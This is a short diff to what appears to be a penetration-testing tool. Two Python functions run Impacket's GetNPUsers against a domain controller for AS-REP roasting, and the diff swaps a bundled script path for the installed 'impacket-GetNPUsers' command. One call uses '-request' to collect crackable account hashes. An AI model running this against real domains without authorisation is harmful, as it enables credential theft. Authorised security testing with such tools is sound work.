@@ -5,7 +5,7 @@ def check_asreproast(domain, username, password, target_ip):
     creds = f"{domain}/{username}:{password}"
 
     output = subprocess.run(
-        ['python', 'app/utils/tools/GetNPUsers.py', '-dc-ip', target_ip, creds],
+        ['impacket-GetNPUsers', '-dc-ip', target_ip, creds],
         capture_output=True,
         text=True
     )
@@ -24,7 +24,7 @@ def run_asreproast(domain, username, password, target_ip):
     creds = f"{domain}/{username}:{password}"
 
     output = subprocess.run(
-        ['python', 'app/utils/tools/GetNPUsers.py', '-dc-ip', target_ip, creds, '-request'],
+        ['impacket-GetNPUsers', '-dc-ip', target_ip, creds, '-request'],
         capture_output=True,
         text=True
     )
